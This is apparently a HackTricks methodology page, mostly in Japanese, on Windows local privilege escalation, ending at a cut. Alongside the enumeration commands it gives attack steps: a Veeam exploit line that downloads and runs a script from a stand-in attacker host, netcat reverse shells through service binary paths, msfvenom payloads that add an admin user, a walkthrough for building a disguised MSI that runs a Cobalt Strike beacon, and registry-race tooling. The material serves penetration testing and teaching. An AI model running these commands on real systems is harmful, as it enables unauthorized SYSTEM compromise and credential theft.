# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation ベクターを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基本概念

### Access Tokens

**Windows Access Tokens を知らない場合は、続行する前に次のページをお読みください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs についての詳細は次のページを確認してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels を知らない場合は、続行する前に次のページをお読みください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙を妨げる**、実行可能ファイルの実行を阻止する、あるいは**あなたの活動を検出する**さまざまな要素があります。privilege escalation の列挙を開始する前に、次の**ページ**を**読む**、これらすべての**防御****メカニズム**を**列挙**してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

AppInfo の secure-path チェックがバイパスされると、`RAiLaunchAdminProcess` 経由で起動される UIAccess プロセスを悪用して、プロンプトなしで High IL に到達できます。専用の UIAccess/Admin Protection バイパス ワークフローは次を確認してください：

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は任意の SYSTEM レジストリ書き込み（RegPwn）に悪用できます：

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。 このデータベースには4,700件以上のセキュリティ脆弱性が登録されており、Windows環境が提示する**massive attack surface**の規模を示しています。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploits の Github リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

env variables に credential/Juicy info が保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

これを有効にする方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で学べます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、完全な実行の詳細や出力結果がすべて記録されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの指示に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Powershell ログの直近15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関するすべての操作と内容の完全な記録が取得され、実行される各コードブロックが逐一文書化されます。このプロセスは各操作の包括的な監査ログを保持し、フォレンジック調査や悪意ある挙動の分析に有用です。実行時の全活動を記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
直近20件のイベントを表示するには、次のコマンドを使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを乗っ取ることができます。

まず、ネットワークが非SSLの WSUS 更新を使用しているかを確認するために、cmd で次のコマンドを実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または PowerShell で次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信があった場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

Windows **domain** 環境では、特定の条件下で **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,** ユーザーが **Resource-Based Constrained Delegation (RBCD)** を構成できる自己権限を持っていること、そしてドメイン内にコンピューターを作成する能力がユーザーにあることが含まれます。これらの**要件**は**デフォルト設定**で満たされる点に注意してください。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

攻撃のフローの詳細については、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を参照してください。

## AlwaysInstallElevated

**もし**これら2つのレジストリが**有効**（値は **0x1**）になっていると、あらゆる権限のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit ペイロード
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

`Write-UserAddMSI` コマンドを power-up から使用して、現在のディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。  
このスクリプトは、ユーザー/グループの追加を促すプリコンパイル済みの MSI インストーラを書き出します（そのため GUI アクセスが必要です）：
```
Write-UserAddMSI
```
作成したバイナリを実行して権限を昇格させるだけです。

### MSI Wrapper

このチュートリアルを読んでこのツールを使ってMSIラッパーを作成する方法を学んでください。**.bat** ファイルは、**単に** **コマンドライン**を**実行**したいだけの場合にラップできます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIXでMSIを作成する


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成する

- Cobalt Strike または Metasploit を使って、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を生成します。
- **Visual Studio** を開き、**Create a new project** を選択し、検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を例えば **AlwaysPrivesc** にし、場所に **`C:\privesc`** を指定し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- **Next** をクリックし続け、4ステップ中のステップ3（choose files to include）まで進みます。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- インストールされたアプリをより正当らしく見せるために、**Author** や **Manufacturer** など他のプロパティを変更できます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** を選択して **OK** をクリックします。これにより、インストーラーが実行されるとすぐに beacon payload が実行されるようになります。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- 最後にビルドします。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSIのインストール

悪意のある `.msi` ファイルの**インストール**を**バックグラウンド**で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を exploit するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検知

### 監査設定

これらの設定は、何が**ログに記録されるか**を決定するため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding のログ送信先を把握することは重要です
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、ドメインに参加しているコンピュータのローカル Administrator パスワードの **管理** を目的としており、各パスワードが **一意で、ランダム化され、定期的に更新される** ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACLs を通じて十分な権限が付与されたユーザーのみがアクセスでき、許可されていればローカル管理者パスワードを表示できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードが LSASS に保存されます** (Local Security Authority Subsystem Service).\
[**このページの WDigest に関する詳細**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによる **メモリの読み取り** やコード注入を **ブロック** することで、システムをさらに保護しています。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。目的は、デバイスに保存された credentials を pass-the-hash のような攻撃から保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントによって使用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常そのユーザーのドメイン資格情報が確立されます。\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属するグループの中に、興味深い権限を持つものがないか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが特権グループのメンバーであれば、権限を昇格できる可能性があります。特権グループと、それらを悪用して権限を昇格する方法については次を参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

**詳しくは** このページで **token** が何かを学んでください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページを確認して、**興味深い token**とそれらを悪用する方法を学んでください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオン中のユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを列挙して、**プロセスのコマンドライン内にパスワードがないかを確認する**。\
実行中のバイナリを**上書きできるか**、またはバイナリフォルダに書き込み権限があるかを確認し、可能な[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できるか調べる:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

実行中のプロセスのメモリダンプは sysinternals の **procdump** を使って作成できます。FTP のようなサービスはメモリ内に **credentials in clear text in memory** を残すことがあるため、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM として実行されているアプリケーションは、ユーザーが CMD を起動したり、ディレクトリを閲覧したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) を開き、"command prompt" を検索して "Click to open Command Prompt" をクリックします。

## サービス

Service Triggers は、特定の条件（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）が発生したときに Windows にサービスを起動させることができます。SERVICE_START 権限がなくても、トリガーを発生させて特権サービスを起動できることがよくあります。列挙と起動の手法については次を参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには**sc**を使用できます
```bash
sc qc <service_name>
```
各サービスの必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" が任意のサービスを変更できるかどうかを確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

このエラーが発生している場合（例: SSDPSRV）:

_システムエラー 1058 が発生しました._\
_そのサービスは無効になっているか、関連付けられた有効なデバイスがないため、開始できません._

次のコマンドを使って有効にできます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存していることを考慮してください（XP SP1 の場合）**

**別の回避策** この問題に対して次のコマンドを実行します:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

サービスに対して "Authenticated users" グループが **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行バイナリを変更することが可能です。**sc** を使って変更および実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
特権昇格は以下のような各種の権限を通じて可能です:

- **SERVICE_CHANGE_CONFIG**: サービスの実行バイナリを再構成できる。
- **WRITE_DAC**: アクセス許可を再設定でき、それによりサービス構成を変更できるようになる。
- **WRITE_OWNER**: 所有権の取得およびアクセス許可の再設定が可能になる。
- **GENERIC_WRITE**: サービス構成を変更する能力を持つ。
- **GENERIC_ALL**: 同様にサービス構成を変更する能力を持つ。

この脆弱性の検出および悪用には _exploit/windows/local/service_permissions_ が利用できる。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるか確認する** または **バイナリが配置されているフォルダに対する書き込み権限があるか** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスによって実行されるすべてのバイナリは **wmic** を使って取得でき（system32 にはないもの）、権限は **icacls** で確認できる:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** を使用することもできます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービス レジストリの変更権限

任意のサービス レジストリを変更できるか確認してください。\
次のようにしてサービス **レジストリ** に対する **権限** を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` パーミッションを持っているか確認してください。もしそうであれば、サービスによって実行されるバイナリを変更できます。

サービスが実行するバイナリの Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

キーの場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` はインストールされているアクセシビリティ機能を列挙します。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` はユーザーが制御する設定を格納します。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオン／secure-desktop の遷移中に作成され、ユーザーによって書き込み可能です。

悪用フロー (CVE-2026-24291 / ATConfig):

1. SYSTEM によって書き込まれるようにしたい **HKCU ATConfig** の値を用意します。
2. secure-desktop コピーをトリガーします（例: **LockWorkstation**）。これにより AT ブローカーのフローが開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を置いて **Win the race** を目指します；oplock が発動したときに、**HKLM Session ATConfig** キーを保護された HKLM ターゲットへの **registry link** に置き換えます。
4. SYSTEM がリダイレクトされた HKLM パスに攻撃者が選んだ値を書き込みます。

任意の HKLM 値書き込みを得たら、サービス設定値を上書きして LPE に繋げます:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常ユーザーが起動できるサービス（例: **`msiserver`**）を選び、書き込み後にそれをトリガーします。注意: 公開されたエクスプロイト実装はレースの一部としてワークステーションをロックします。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services レジストリの AppendData/AddSubdirectory 権限

レジストリに対してこの権限がある場合、**そのレジストリからサブレジストリを作成できます**。Windows services の場合、これは**任意のコードを実行するのに十分です**:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 引用符のないサービスパス

実行ファイルへのパスが引用符で囲まれていないと、Windows はスペースの前までの各候補パスを順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のファイルを実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は検出および悪用できます** metasploit: `exploit/windows/local/trusted\_service\_path` metasploit で手動でサービスバイナリを作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、サービスが失敗した場合に実行されるアクションをユーザーが指定できます。この機能は、binary を指すように設定できます。もしこの binary が置き換え可能であれば、privilege escalation が可能になることがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**binaries の権限**（例えば binary を上書きして privilege escalation が可能になるかもしれません）および **フォルダ**（[DLL Hijacking](dll-hijacking/index.html)）の権限を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読み取るために設定ファイルを変更できるか、または管理者アカウント（schedtasks）で実行されるバイナリを変更できるかを確認します。

システム内の弱いフォルダ/ファイルの権限を見つける方法の一つは、次のようにすることです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
